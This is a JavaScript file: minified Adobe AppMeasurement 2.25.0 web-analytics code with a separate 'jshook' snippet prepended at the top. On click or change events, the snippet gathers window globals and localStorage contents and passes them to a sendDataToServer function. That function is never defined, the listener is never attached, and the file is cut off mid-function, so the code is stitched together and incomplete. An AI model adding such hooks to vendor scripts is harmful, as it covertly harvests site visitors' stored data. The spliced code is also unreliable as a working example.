let globalVariables = [];
let jshookEvents = ['click', 'change', 'keydown', 'focus', 'blur'];
let localStorageKeyPressed = false;

// Perform operation after capturing jshook events
function handleEvent(e) {
  if (e.type === 'click' || e.type === 'change') {
    let collectedData = collectWindowData();
    collectedData['jshookEventsTriggered'] = e.type;
    collectedData['localStorageItems'] = localstorageTrack();
    sendDataToServer(collectedData);
  }
}

// Store global variables
Object.keys(window).forEach(key => {
  if (!globalVariables.includes(key)) {
    globalVariables.push(key);
  }
});

// Add jshook event listener to 'document'
// For license information, see `https://assets.adobedtm.com/extensions/EPef068a8d6dd34a43866d9a80cc98baab/AppMeasurement.js`.
function AppMeasurement(e) {
  var t = this;
  t.version = "2.25.0";
  var n = window;
  n.s_c_in || (n.s_c_il = [], n.s_c_in = 0), t._il = n.s_c_il, t._in = n.s_c_in, t._il[t._in] = t, n.s_c_in++, t._c = "s_c";
  var a = n.AppMeasurement.uc;
  a || (a = null);
  var i,
    r,
    o,
    c = n;
  try {
    for (i = c.parent, r = c.location; i && i.location && r && "" + i.location != "" + r && c.location && "" + i.location != "" + c.location && i.location.host === r.host;) i = (c = i).parent;
  } catch (e) {}
  t.log = function (e) {
    try {
      console.log(e);
    } catch (e) {}
  }, t.Ya = function (e) {
    return "" + parseInt(e) == "" + e;
  }, t.replace = function (e, t, n) {
    return !e || 0 > e.indexOf(t) ? e : e.split(t).join(n);
  }, t.escape = function (e) {
    var n, a;
    if (!e) return e;
    for (e = encodeURIComponent(e), n = 0; 7 > n; n++) a = "+~!*()'".substring(n, n + 1), 0 <= e.indexOf(a) && (e = t.replace(e, a, "%" + a.charCodeAt(0).toString(16).toUpperCase()));
    return e;
  }, t.unescape = function (e) {
    if (!e) return e;
    e = 0 <= e.indexOf("+") ? t.replace(e, "+", " ") : e;
    try {
      return decodeURIComponent(e);
    } catch (e) {}
    return unescape(e);
  }, t.ac = function () {
    var e,
      a = n.location.hostname,
      i = t.fpCookieDomainPeriods;
    if (i || (i = t.cookieDomainPeriods), a && !t.Ra && !/^[0-9.]+$/.test(a) && (i = 2 < (i = i ? parseInt(i) : 2) ? i : 2, 0 <= (e = a.lastIndexOf(".")))) {
      for (; 0 <= e && 1 < i;) e = a.lastIndexOf(".", e - 1), i--;
      t.Ra = 0 < e ? a.substring(e) : a;
    }
    return t.Ra;
  }, t.c_r = t.cookieRead = function (e) {
    e = t.escape(e);
    var n = " " + t.d.cookie,
      a = n.indexOf(" " + e + "="),
      i = 0 > a ? a : n.indexOf(";", a);
    return "[[B]]" != (e = 0 > a ? "" : t.unescape(n.substring(a + 2 + e.length, 0 > i ? n.length : i))) ? e : "";
  }, t.c_w = t.cookieWrite = function (e, n, a) {
    var i,
      r = t.ac(),
      o = t.cookieLifetime;
    return n = "" + n, o = o ? ("" + o).toUpperCase() : "", a && "SESSION" != o && "NONE" != o && ((i = "" != n ? parseInt(o || 0) : -60) ? (a = new Date()).setTime(a.getTime() + 1e3 * i) : 1 === a && (i = (a = new Date()).getYear(), a.setYear(i + 2 + (1900 > i ? 1900 : 0)))), e && "NONE" != o ? (t.d.cookie = t.escape(e) + "=" + t.escape("" != n ? n : "[[B]]") + "; path=/;" + (a && "SESSION" != o ? " expires=" + a.toUTCString() + ";" : "") + (r ? " domain=" + r + ";" : "") + (t.writeSecureCookies ? " secure;" : ""), t.cookieRead(e) == n) : 0;
  }, t.Yb = function () {
    var e = t.Util.getIeVersion();
    "number" == typeof e && 10 > e && (t.unsupportedBrowser = !0, t.Jb(t, function () {}));
  }, t.Ea = function () {
    var e = navigator.userAgent;
    return "Microsoft Internet Explorer" === navigator.appName || 0 <= e.indexOf("MSIE ") || 0 <= e.indexOf("Trident/") && 0 <= e.indexOf("Windows NT 6");
  }, t.Jb = function (e, t) {
    for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && "function" == typeof e[n] && (e[n] = t);
  }, t.M = [], t.ja = function (e, n, a) {
    if (t.Sa) return 0;
    t.maxDelay || (t.maxDelay = 250);
    var i = 0,
      r = new Date().getTime() + t.maxDelay,
      o = t.d.visibilityState,
      c = ["webkitvisibilitychange", "visibilitychange"];
    if (o || (o = t.d.webkitVisibilityState), o && "prerender" == o) {
      if (!t.ka) for (t.ka = 1, a = 0; a < c.length; a++) t.d.addEventListener(c[a], function () {
        var e = t.d.visibilityState;
        e || (e = t.d.webkitVisibilityState), "visible" == e && (t.ka = 0, t.delayReady());
      });
      i = 1, r = 0;
    } else a || t.v("_d") && (i = 1);
    return i && (t.M.push({
      m: e,
      a: n,
      t: r
    }), t.ka || setTimeout(t.delayReady, t.maxDelay)), i;
  }, t.delayReady = function () {
    var e,
      n = new Date().getTime(),
      a = 0;
    for (t.v("_d") ? a = 1 : t.Ga(); 0 < t.M.length;) {
      if (e = t.M.shift(), a && !e.t && e.t > n) {
        t.M.unshift(e), setTimeout(t.delayReady, parseInt(t.maxDelay / 2));
        break;
      }
      t.Sa = 1, t[e.m].apply(t, e.a), t.Sa = 0;
    }
  }, t.setAccount = t.sa = function (e) {
    var n, a;
    if (!t.ja("setAccount", arguments)) if (t.account = e, t.allAccounts) for (n = t.allAccounts.concat(e.split(",")), t.allAccounts = [], n.sort(), a = 0; a < n.length; a++) 0 != a && n[a - 1] == n[a] || t.allAccounts.push(n[a]);else t.allAccounts = e.split(",");
  }, t.foreachVar = function (e, n) {
    var a,
      i,
      r,
      o,
      c = "";
    for (r = i = "", t.lightProfileID ? (a = t.Q, (c = t.lightTrackVars) && (c = "," + c + "," + t.pa.join(",") + ",")) : (a = t.i, (t.pe || t.linkType) && (c = t.linkTrackVars, i = t.linkTrackEvents, t.pe && (r = t.pe.substring(0, 1).toUpperCase() + t.pe.substring(1), t[r] && (c = t[r].qc, i = t[r].pc))), c && (c = "," + c + "," + t.F.join(",") + ","), i && c && (c += ",events,")), n && (n = "," + n + ","), i = 0; i < a.length; i++) r = a[i], (o = t[r]) && (!c || 0 <= c.indexOf("," + r + ",")) && (!n || 0 <= n.indexOf("," + r + ",")) && e(r, o);
  }, t.l = function (e, n, a, i, r) {
    var o,
      c,
      s,
      l,
      u = "",
      f = 0;
    if ("contextData" == e && (e = "c"), "clientHints" == e && (e = "h"), n) {
      for (o in n) if (!(Object.prototype[o] || r && o.substring(0, r.length) != r) && n[o] && (!a || 0 <= a.indexOf("," + (i ? i + "." : "") + o + ","))) {
        if (s = !1, f) for (c = 0; c < f.length; c++) if (o.substring(0, f[c].length) == f[c]) {
          s = !0;
          break;
        }
        if (!s && ("" == u && (u += "&" + e + "."), c = n[o], r && (o = o.substring(r.length)), 0 < o.length)) if (0 < (s = o.indexOf("."))) s = (r || "") + (c = o.substring(0, s)) + ".", f || (f = []), f.push(s), u += t.l(c, n, a, i, s);else if ("boolean" == typeof c && (c = c ? "true" : "false"), c) {
          if ("retrieveLightData" == i && 0 > r.indexOf(".contextData.")) switch (s = o.substring(0, 4), l = o.substring(4), o) {
            case "transactionID":
              o = "xact";
              break;
            case "channel":
              o = "ch";
              break;
            case "campaign":
              o = "v0";
              break;
            default:
              t.Ya(l) && ("prop" == s ? o = "c" + l : "eVar" == s ? o = "v" + l : "list" == s ? o = "l" + l : "hier" == s && (o = "h" + l, c = c.substring(0, 255)));
          }
          u += "&" + t.escape(o) + "=" + t.escape(c);
        }
      }
      "" != u && (u += "&." + e);
    }
    return u;
  }, t.usePostbacks = 0, t.ec = function () {
    var e,
      n,
      i,
      r,
      o,
      c,
      s,
      l,
      u = "",
      f = "",
      p = "",
      g = r = "",
      d = t.W();
    if (t.lightProfileID ? (e = t.Q, (f = t.lightTrackVars) && (f = "," + f + "," + t.pa.join(",") + ",")) : (e = t.i, (t.pe || t.linkType) && (f = t.linkTrackVars, p = t.linkTrackEvents, t.pe && (r = t.pe.substring(0, 1).toUpperCase() + t.pe.substring(1), t[r] && (f = t[r].qc, p = t[r].pc))), f && (f = "," + f + "," + t.F.join(",") + ","), p && (p = "," + p + ",", f && (f += ",events,")), t.events2 && (g += ("" != g ? "," : "") + t.events2)), d && d.getCustomerIDs) {
      if (r = a, o = d.getCustomerIDs()) for (n in o) Object.prototype[n] || "object" == typeof (i = o[n]) && (r || (r = {}), i.id && (r[n + ".id"] = i.id), i.authState && (r[n + ".as"] = i.authState));
      r && (u += t.l("cid", r));
    }
    for (t.AudienceManagement && t.AudienceManagement.isReady() && (u += t.l("d", t.AudienceManagement.getEventCallConfigParams())), n = 0; n < e.length; n++) {
      if (r = e[n], o = t[r], i = r.substring(0, 4), c = r.substring(4), o || ("events" == r && g ? (o = g, g = "") : "marketingCloudOrgID" == r && d && t.X("ECID") && (o = d.marketingCloudOrgID)), o && (!f || 0 <= f.indexOf("," + r + ","))) {
        switch (r) {
          case "customerPerspective":
            r = "cp";
            break;
          case "marketingCloudOrgID":
            r = "mcorgid";
            break;
          case "supplementalDataID":
            r = "sdid";
            break;
          case "timestamp":
            r = "ts";
            break;
          case "dynamicVariablePrefix":
            r = "D";
            break;
          case "visitorID":
            r = "vid";
            break;
          case "marketingCloudVisitorID":
            r = "mid";
            break;
          case "analyticsVisitorID":
            r = "aid";
            break;
          case "audienceManagerLocationHint":
            r = "aamlh";
            break;
          case "audienceManagerBlob":
            r = "aamb";
            break;
          case "authState":
            r = "as";
            break;
          case "pageURL":
            r = "g", 255 < o.length && (t.pageURLRest = o.substring(255), o = o.substring(0, 255));
            break;
          case "pageURLRest":
            r = "-g";
            break;
          case "referrer":
            r = "r";
            break;
          case "vmk":
          case "visitorMigrationKey":
            r = "vmt";
            break;
          case "visitorMigrationServer":
            r = "vmf", t.ssl && t.visitorMigrationServerSecure && (o = "");
            break;
          case "visitorMigrationServerSecure":
            r = "vmf", !t.ssl && t.visitorMigrationServer && (o = "");
            break;
          case "charSet":
            r = "ce";
            break;
          case "visitorNamespace":
            r = "ns";
            break;
          case "cookieDomainPeriods":
            r = "cdp";
            break;
          case "cookieLifetime":
            r = "cl";
            break;
          case "variableProvider":
            r = "vvp";
            break;
          case "currencyCode":
            r = "cc";
            break;
          case "channel":
            r = "ch";
            break;
          case "transactionID":
            r = "xact";
            break;
          case "campaign":
            r = "v0";
            break;
          case "latitude":
            r = "lat";
            break;
          case "longitude":
            r = "lon";
            break;
          case "resolution":
            r = "s";
            break;
          case "colorDepth":
            r = "c";
            break;
          case "javascriptVersion":
            r = "j";
            break;
          case "javaEnabled":
            r = "v";
            break;
          case "cookiesEnabled":
            r = "k";
            break;
          case "browserWidth":
            r = "bw";
            break;
          case "browserHeight":
            r = "bh";
            break;
          case "connectionType":
            r = "ct";
            break;
          case "homepage":
            r = "hp";
            break;
          case "events":
            if (g && (o += ("" != o ? "," : "") + g), p) for (c = o.split(","), o = "", i = 0; i < c.length; i++) 0 <= (l = (s = c[i]).indexOf("=")) && (s = s.substring(0, l)), 0 <= (l = s.indexOf(":")) && (s = s.substring(0, l)), 0 <= p.indexOf("," + s + ",") && (o += (o ? "," : "") + c[i]);
            break;
          case "events2":
            o = "";
            break;
          case "contextData":
            u += t.l("c", t[r], f, r), o = "";
            break;
          case "clientHints":
            u += t.l("h", t[r], f, r), o = "";
            break;
          case "lightProfileID":
            r = "mtp";
            break;
          case "lightStoreForSeconds":
            r = "mtss", t.lightProfileID || (o = "");
            break;
          case "lightIncrementBy":
            r = "mti", t.lightProfileID || (o = "");
            break;
          case "retrieveLightProfiles":
            r = "mtsr";
            break;
          case "deleteLightProfiles":
            r = "mtsd";
            break;
          case "retrieveLightData":
            t.retrieveLightProfiles && (u += t.l("mts", t[r], f, r)), o = "";
            break;
          default:
            t.Ya(c) && ("prop" == i ? r = "c" + c : "eVar" == i ? r = "v" + c : "list" == i ? r = "l" + c : "hier" == i && (r = "h" + c, o = o.substring(0, 255)));
        }
        o && (u += "&" + r + "=" + ("pev" != r.substring(0, 3) ? t.escape(o) : o));
      }
      "pev3" == r && t.e && (u += t.e);
    }
    return t.oa && (u += "&lrt=" + t.oa, t.oa = null), u;
  }, t.C = function (e) {
    var t = e.tagName;
    return "undefined" != "" + e.xc || "undefined" != "" + e.lc && "HTML" != ("" + e.lc).toUpperCase() ? "" : ("SHAPE" == (t = t && t.toUpperCase ? t.toUpperCase() : "") && (t = ""), t && (("INPUT" == t || "BUTTON" == t) && e.type && e.type.toUpperCase ? t = e.type.toUpperCase() : !t && e.href && (t = "A")), t);
  }, t.Ua = function (e) {
    var t,
      a,
      i,
      r = n.location,
      o = e.href ? e.href : "";
    return "string" != typeof o && (o = ""), t = o.indexOf(":"), a = o.indexOf("?"), i = o.indexOf("/"), o && (0 > t || 0 <= a && t > a || 0 <= i && t > i) && (a = e.protocol && 1 < e.protocol.length ? e.protocol : r.protocol ? r.protocol : "", t = r.pathname.lastIndexOf("/"), o = (a ? a + "//" : "") + (e.host ? e.host : r.host ? r.host : "") + ("/" != o.substring(0, 1) ? r.pathname.substring(0, 0 > t ? 0 : t) + "/" : "") + o), o;
  }, t.N = function (e) {
    var n,
      a,
      i = t.C(e),
      r = "",
      o = 0;
    return i && (n = e.protocol, a = e.onclick, !e.href || "A" != i && "AREA" != i || a && n && !(0 > n.toLowerCase().indexOf("javascript")) ? a ? (r = t.replace(t.replace(t.replace(t.replace("" + a, "\r", ""), "\n", ""), "\t", ""), " ", ""), o = 2) : "INPUT" == i || "SUBMIT" == i ? (e.value ? r = e.value : e.innerText ? r = e.innerText : e.textContent && (r = e.textContent), o = 3) : "IMAGE" == i && e.src && (r = e.src) : r = t.Ua(e), r) ? {
      id: r.substring(0, 100),
      type: o
    } : 0;
  }, t.vc = function (e) {
    for (var n = t.C(e), a = t.N(e); e && !a && "BODY" != n;) (e = e.parentElement ? e.parentElement : e.parentNode) && (n = t.C(e), a = t.N(e));
    return a && "BODY" != n || (e = 0), e && (0 <= (n = e.onclick ? "" + e.onclick : "").indexOf(".tl(") || 0 <= n.indexOf(".trackLink(")) && (e = 0), e;
  }, t.kc = function () {
    var e,
      a,
      i,
      r,
      o = t.linkObject,
      c = t.linkType,
      s = t.linkURL;
    if (t.qa = 1, o || (t.qa = 0, o = t.clickObject), o) {
      for (e = t.C(o), a = t.N(o); o && !a && "BODY" != e;) (o = o.parentElement ? o.parentElement : o.parentNode) && (e = t.C(o), a = t.N(o));
      if (a && "BODY" != e || (o = 0), o && !t.linkObject) {
        var l = o.onclick ? "" + o.onclick : "";
        (0 <= l.indexOf(".tl(") || 0 <= l.indexOf(".trackLink(")) && (o = 0);
      }
    } else t.qa = 1;
    if (!s && o && (s = t.Ua(o)), s && !t.linkLeaveQueryString && 0 <= (i = s.indexOf("?")) && (s = s.substring(0, i)), !c && s) {
      var u,
        f = 0,
        p = 0;
      if (t.trackDownloadLinks && t.linkDownloadFileTypes) for (i = (l = s.toLowerCase()).indexOf("?"), r = l.indexOf("#"), 0 <= i ? 0 <= r && r < i && (i = r) : i = r, 0 <= i && (l = l.substring(0, i)), i = t.linkDownloadFileTypes.toLowerCase().split(","), r = 0; r < i.length; r++) (u = i[r]) && l.substring(l.length - (u.length + 1)) == "." + u && (c = "d");
      if (t.trackExternalLinks && !c && (l = s.toLowerCase(), t.Xa(l) && (t.linkInternalFilters || (t.linkInternalFilters = n.location.hostname), i = 0, t.linkExternalFilters ? (i = t.linkExternalFilters.toLowerCase().split(","), f = 1) : t.linkInternalFilters && (i = t.linkInternalFilters.toLowerCase().split(",")), i))) {
        for (r = 0; r < i.length; r++) u = i[r], 0 <= l.indexOf(u) && (p = 1);
        p ? f && (c = "e") : f || (c = "e");
      }
    }
    t.linkObject = o, t.linkURL = s, t.linkType = c, (t.trackClickMap || t.trackInlineStats) && (t.e = "", o && (c = t.pageName, s = 1, o = o.sourceIndex, c || (c = t.pageURL, s = 0), n.s_objectID && (a.id = n.s_objectID, o = a.type = 1), c && a && a.id && e && (t.e = "&pid=" + t.escape(c.substring(0, 255)) + (s ? "&pidt=" + s : "") + "&oid=" + t.escape(a.id.substring(0, 100)) + (a.type ? "&oidt=" + a.type : "") + "&ot=" + e + (o ? "&oi=" + o : ""))));
  }, t.fc = function () {
    var e = t.qa,
      n = t.linkType,
      a = t.linkURL,
      i = t.linkName;
    if (n && (a || i) && ("d" != (n = n.toLowerCase()) && "e" != n && (n = "o"), t.pe = "lnk_" + n, t.decodeLinkParameters ? (t.pev1 = a ? t.unescape(a) : "", t.pev2 = i ? t.unescape(i) : "", t.pev1 = t.escape(t.pev1), t.pev2 = t.escape(t.pev2)) : (t.pev1 = a ? t.escape(a) : "", t.pev2 = i ? t.escape(i) : ""), e = 1), t.abort && (e = 0), t.trackClickMap || t.trackInlineStats || t.hc()) {
      n = {}, a = 0;
      var r,
        o,
        c,
        s = (l = t.Db()) ? l.split("&") : 0,
        l = 0;
      if (s) for (r = 0; r < s.length; r++) o = s[r].split("="), i = t.unescape(o[0]).split(","), n[o = t.unescape(o[1])] = i;
      for (c in i = t.account.split(","), r = {}, t.contextData) c && !Object.prototype[c] && "a.activitymap." == c.substring(0, 14) && (r[c] = t.contextData[c], t.contextData[c] = "");
      if (t.e = t.l("c", r) + (t.e ? t.e : ""), e || t.e) {
        for (o in e && !t.e && (l = 1), n) if (!Object.prototype[o]) for (c = 0; c < i.length; c++) for (l && (s = n[o].join(",")) == t.account && (t.e += ("&" != o.charAt(0) ? "&" : "") + o, n[o] = [], a = 1), r = 0; r < n[o].length; r++) (s = n[o][r]) == i[c] && (l && (t.e += "&u=" + t.escape(s) + ("&" != o.charAt(0) ? "&" : "") + o + "&u=0"), n[o].splice(r, 1), a = 1);
        if (e || (a = 1), a) {
          for (o in l = "", r = 2, !e && t.e && (l = t.escape(i.join(",")) + "=" + t.escape(t.e), r = 1), n) !Object.prototype[o] && 0 < r && 0 < n[o].length && (l += (l ? "&" : "") + t.escape(n[o].join(",")) + "=" + t.escape(o), r--);
          t.Lb(l);
        }
      }
    }
    return e;
  }, t.Db = function () {
    if (!t.useLinkTrackSessionStorage) return t.cookieRead(t.R);
    if (t.o(n.sessionStorage)) try {
      return n.sessionStorage.getItem(t.R);
    } catch (e) {}
  }, t.Lb = function (e) {
    if (t.useLinkTrackSessionStorage) {
      if (t.o(n.sessionStorage)) try {
        n.sessionStorage.setItem(t.R, e);
      } catch (e) {}
    } else t.cookieWrite(t.R, e);
  }, t.gc = function () {
    if (!t.oc) {
      var e,
        n,
        a = new Date(),
        i = c.location,
        r = n = e = "",
        o = "",
        s = "",
        l = "1.2",
        u = t.cookieWrite("s_cc", "true", 0) ? "Y" : "N",
        f = "",
        p = "";
      if (a.setUTCDate && (l = "1.3", 0 .toPrecision && (l = "1.5", (a = []).forEach))) {
        l = "1.6", n = 0, e = {};
        try {
          (n = new Iterator(e)).next && (l = "1.7", a.reduce && (l = "1.8").trim && (l = "1.8.1", Date.parse && (l = "1.8.2", Object.create && (l = "1.8.5"))));
        } catch (e) {}
      }
      e = screen.width + "x" + screen.height, r = navigator.javaEnabled() ? "Y" : "N", n = screen.pixelDepth ? screen.pixelDepth : screen.colorDepth, o = t.w.innerWidth ? t.w.innerWidth : t.d.documentElement.offsetWidth, s = t.w.innerHeight ? t.w.innerHeight : t.d.documentElement.offsetHeight;
      try {
        t.b.addBehavior("#default#homePage"), f = t.b.wc(i) ? "Y" : "N";
      } catch (e) {}
      try {
        t.b.addBehavior("#default#clientCaps"), p = t.b.connectionType;
      } catch (e) {}
      t.resolution = e, t.colorDepth = n, t.javascriptVersion = l, t.javaEnabled = r, t.cookiesEnabled = u, t.browserWidth = o, t.browserHeight = s, t.connectionType = p, t.homepage = f, t.oc = 1;
    }
  }, t.ob = function () {
    if (t.collectHighEntropyUserAgentHints && !t.J && t.jb()) {
      t.J = !0;
      try {
        navigator.userAgentData.getHighEntropyValues(t.wa).then(function (e) {
          t.clientHints = {}, t.wa.forEach(function (n) {
            Object.prototype.hasOwnProperty.call(e, n) && (t.clientHints[n] = e[n]);
          });
        }).catch(function (e) {
          t.J = !1, t.clientHints = {}, t.debugTracking && t.log(e.message);
        });
      } catch (e) {
        t.J = !1, t.clientHints = {}, t.debugTracking && t.log(e.message);
      }
    } else t.clientHints = {};
  }, t.jb = function () {
    return void 0 !== navigator.userAgentData;
  }, t.S = {}, t.loadModule = function (e, a) {
    var i = t.S[e];
    if (!i) {
      i = n["AppMeasurement_Module_" + e] ? new n["AppMeasurement_Module_" + e](t) : {}, t.S[e] = t[e] = i, i.vb = function () {
        return i.Gb;
      }, i.Mb = function (n) {
        (i.Gb = n) && (t[e + "_onLoad"] = n, t.ja(e + "_onLoad", [t, i], 1) || n(t, i));
      };
      try {
        Object.defineProperty ? Object.defineProperty(i, "onLoad", {
          get: i.vb,
          set: i.Mb
        }) : i._olc = 1;
      } catch (e) {
        i._olc = 1;
      }
    }
    a && (t[e + "_onLoad"] = a, t.ja(e + "_onLoad", [t, i], 1) || a(t, i));
  }, t.v = function (e) {
    var n, a;
    for (n in t.S) if (!Object.prototype[n] && (a = t.S[n]) && (a._olc && a.onLoad && (a._olc = 0, a.onLoad(t, a)), a[e] && a[e]())) return 1;
    return 0;
  }, t.hc = function () {
    return !(!t.ActivityMap || !t.ActivityMap._c);
  }, t.ic = function () {
    var e = Math.floor(1e13 * Math.random()),
      n = t.visitorSampling,
      a = t.visitorSamplingGroup,
      i = (a = "s_vsn_" + (t.visitorNamespace ? t.visitorNamespace : t.account) + (a ? "_" + a : ""), t.cookieRead(a));
    if (n) {
      if (n *= 100, i && (i = parseInt(i)), !i) {
        if (!t.cookieWrite(a, e)) return 0;
        i = e;
      }
      if (i % 1e4 > n) return 0;
    }
    return 1;
  }, t.U = function (e, n) {
    var a, i, r, o, c, s, l;
    for (l = {}, a = 0; 2 > a; a++) for (i = 0 < a ? t.Na : t.i, r = 0; r < i.length; r++) if ((c = e[o = i[r]]) || e["!" + o]) {
      if (c && !n && ("contextData" == o || "retrieveLightData" == o) && t[o]) for (s in t[o]) c[s] || (c[s] = t[o][s]);
      t[o] || (l["!" + o] = 1), l[o] = t[o], t[o] = c;
    }
    return l;
  }, t.tc = function (e) {
    var n, a, i, r;
    for (n = 0; 2 > n; n++) for (a = 0 < n ? t.Na : t.i, i = 0; i < a.length; i++) e[r = a[i]] = t[r], e[r] || "prop" !== r.substring(0, 4) && "eVar" !== r.substring(0, 4) && "hier" !== r.substring(0, 4) && "list" !== r.substring(0, 4) && "channel" !== r && "events" !== r && "eventList" !== r && "products" !== r && "productList" !== r && "purchaseID" !== r && "transactionID" !== r && "state" !== r && "zip" !== r && "campaign" !== r && "events2" !== r && "latitude" !== r && "longitude" !== r && "ms_a" !== r && "contextData" !== r && "supplementalDataID" !== r && "tnt" !== r && "timestamp" !== r && "abort" !== r && "useBeacon" !== r && "linkObject" !== r && "clickObject" !== r && "linkType" !== r && "linkName" !== r && "linkURL" !== r && "bodyClickTarget" !== r && "bodyClickFunction" !== r || (e["!" + r] = 1);
  }, t.$b = function (e) {
    var t,
      n,
      a,
      i,
      r,
      o,
      c = 0,
      s = "",
      l = "";
    if (e && 255 < e.length && 0 < (n = (t = "" + e).indexOf("?")) && (o = t.substring(n + 1), a = 0, "http://" == (i = (t = t.substring(0, n)).toLowerCase()).substring(0, 7) ? a += 7 : "https://" == i.substring(0, 8) && (a += 8), 0 < (n = i.indexOf("/", a)) && (i = i.substring(a, n), r = t.substring(n), t = t.substring(0, n), 0 <= i.indexOf("google") ? c = ",q,ie,start,search_key,word,kw,cd," : 0 <= i.indexOf("yahoo.co") ? c = ",p,ei," : 0 <= i.indexOf("baidu.") && (c = ",wd,word,"), c && o))) {
      if ((e = o.split("&")) && 1 < e.length) {
        for (a = 0; a < e.length; a++) 0 < (n = (i = e[a]).indexOf("=")) && 0 <= c.indexOf("," + i.substring(0, n) + ",") ? s += (s ? "&" : "") + i : l += (l ? "&" : "") + i;
        s && l ? o = s + "&" + l : l = "";
      }
      e = t + (0 < (n = 253 - (o.length - l.length) - t.length) ? r.substring(0, n) : "") + "?" + o;
    }
    return e;
  }, t.mb = function (e) {
    var n = t.d.visibilityState,
      a = ["webkitvisibilitychange", "visibilitychange"];
    if (n || (n = t.d.webkitVisibilityState), n && "prerender" == n) {
      if (e) for (n = 0; n < a.length; n++) t.d.addEventListener(a[n], function () {
        var n = t.d.visibilityState;
        n || (n = t.d.webkitVisibilityState), "visible" == n && e();
      });
      return !1;
    }
    return !0;
  }, t.ga = !1, t.H = !1, t.Pb = function () {
    t.H = !0, t.q();
  }, t.K = !1, t.Qb = function (e) {
    t.marketingCloudVisitorID = e.MCMID, t.visitorOptedOut = e.MCOPTOUT, t.analyticsVisitorID = e.MCAID, t.audienceManagerLocationHint = e.MCAAMLH, t.audienceManagerBlob = e.MCAAMB, t.K = !1, t.q();
  }, t.lb = function (e) {
    return t.maxDelay || (t.maxDelay = 250), !t.v("_d") || (e && setTimeout(function () {
      e();
    }, t.maxDelay), !1);
  }, t.ea = !1, t.G = !1, t.Ga = function () {
    t.G = !0, t.q();
  }, t.isReadyToTrack = function () {
    var e = !0;
    return !(!t.Ab() || !t.yb()) && (t.Cb() || (e = !1), t.Fb() || (e = !1), t.nb() || (e = !1), e);
  }, t.Ab = function () {
    return t.ga || t.H || (t.mb(t.Pb) ? t.H = !0 : t.ga = !0), !(t.ga && !t.H);
  }, t.yb = function () {
    var e = t.Ca();
    if (e) {
      if (!t.ya && !t.fa) return e.fetchPermissions(t.Hb, !0), t.fa = !0, !1;
      if (!t.ya) return !1;
      if (!e.isApproved(e.Categories.ANALYTICS)) return !1;
    }
    return !0;
  }, t.X = function (e) {
    var n = t.Ca();
    return !(n && !n.isApproved(n.Categories[e]));
  }, t.Ca = function () {
    return n.adobe && n.adobe.optIn ? n.adobe.optIn : null;
  }, t.ca = !0, t.Cb = function () {
    var e = t.W();
    return !e || !e.getVisitorValues || (t.ca && (t.ca = !1, t.K || (t.K = !0, e.getVisitorValues(t.Qb))), !t.K);
  }, t.W = function () {
    var e = t.visitor;
    return e && !e.isAllowed() && (e = null), e;
  }, t.Fb = function () {
    return t.ea || t.G || (t.lb(t.Ga) ? t.G = !0 : t.ea = !0), !(t.ea && !t.G);
  }, t.nb = function () {
    return t.J || t.clientHints || t.ob(), t.clientHints;
  }, t.fa = !1, t.Hb = function () {
    t.fa = !1, t.ya = !0;
  }, t.j = a, t.r = 0, t.callbackWhenReadyToTrack = function (e, n, i) {
    var r;
    (r = {}).Ub = e, r.Tb = n, r.Rb = i, t.j == a && (t.j = []), t.j.push(r), 0 == t.r && (t.r = setInterval(t.q, 100));
  }, t.q = function () {
    var e;
    if (t.isReadyToTrack() && (t.Nb(), t.j != a)) for (; 0 < t.j.length;) (e = t.j.shift()).Tb.apply(e.Ub, e.Rb);
  }, t.Nb = function () {
    t.r && (clearInterval(t.r), t.r = 0);
  }, t.za = function (e) {
    var n,
      i = {};
    if (t.tc(i), e != a) for (n in e) i[n] = e[n];
    t.callbackWhenReadyToTrack(t, t.Ma, [i]), t.Ja();
  }, t.bc = function () {
    var e,
      n = t.cookieRead("s_fid"),
      a = "",
      i = "";
    e = 8;
    var r = 4;
    if (!n || 0 > n.indexOf("-")) {
      for (n = 0; 16 > n; n++) e = Math.floor(Math.random() * e), a += "0123456789ABCDEF".substring(e, e + 1), e = Math.floor(Math.random() * r), i += "0123456789ABCDEF".substring(e, e + 1), e = r = 16;
      n = a + "-" + i;
    }
    return t.cookieWrite("s_fid", n, 1) || (n = 0), n;
  }, t.Ma = function (e) {
    var a,
      i = new Date(),
      r = "s" + Math.floor(i.getTime() / 108e5) % 10 + Math.floor(1e13 * Math.random()),
      o = i.getYear(),
      s = (o = "t=" + t.escape(i.getDate() + "/" + i.getMonth() + "/" + (1900 > o ? o + 1900 : o) + " " + i.getHours() + ":" + i.getMinutes() + ":" + i.getSeconds() + " " + i.getDay() + " " + i.getTimezoneOffset()), t.W());
    e && (a = t.U(e, 1)), t.ic() && !t.visitorOptedOut && (t.Da() || (t.fid = t.bc()), t.kc(), t.usePlugins && t.doPlugins && t.doPlugins(t), t.account && (t.abort || (t.trackOffline && !t.timestamp && (t.timestamp = Math.floor(i.getTime() / 1e3)), e = n.location, t.pageURL || (t.pageURL = e.href ? e.href : e), t.referrer || t.hb || (e = t.Util.getQueryParam("adobe_mc_ref", null, null, !0), t.referrer = e || void 0 === e ? void 0 === e ? "" : e : c.document.referrer), t.hb = 1, !t.referrer && t.da && (t.referrer = t.da), t.da = 0, t.referrer = t.$b(t.referrer), t.v("_g")), t.fc() && !t.abort && (s && t.X("TARGET") && !t.supplementalDataID && s.getSupplementalDataID && (t.supplementalDataID = s.getSupplementalDataID("AppMeasurement:" + t._in, !t.expectSupplementalData)), t.X("AAM") || (t.contextData["cm.ssf"] = 1), t.gc(), t.Ib(), o += t.ec(), t.Eb(r, o), t.v("_t"), t.referrer = "", t.contextData && t.contextData.excCodes && (t.contextData.excCodes = 0)))), t.referrer && (t.da = t.referrer), t.Ja(), a && t.U(a, 1);
  }, t.t = t.track = function (e, n) {
    n && t.U(n), t.ca = !0, t.isReadyToTrack() ? null != t.j && 0 < t.j.length ? (t.za(e), t.q()) : t.Ma(e) : t.za(e);
  }, t.Ib = function () {
    t.writeSecureCookies && !t.ssl && t.ib();
  }, t.ib = function () {
    t.contextData.excCodes = t.contextData.excCodes || [], t.contextData.excCodes.push(1);
  }, t.Ja = function () {
    t.abort = t.supplementalDataID = t.timestamp = t.pageURLRest = t.linkObject = t.clickObject = t.linkURL = t.linkName = t.linkType = n.s_objectID = t.pe = t.pev1 = t.pev2 = t.pev3 = t.e = t.lightProfileID = t.useBeacon = t.referrer = 0;
  }, t.Ia = [], t.registerPreTrackCallback = function (e) {
    for (var n = [], a = 1; a < arguments.length; a++) n.push(arguments[a]);
    "function" == typeof e ? t.Ia.push([e, n]) : t.debugTracking && t.log("Warning, Non function type passed to registerPreTrackCallback");
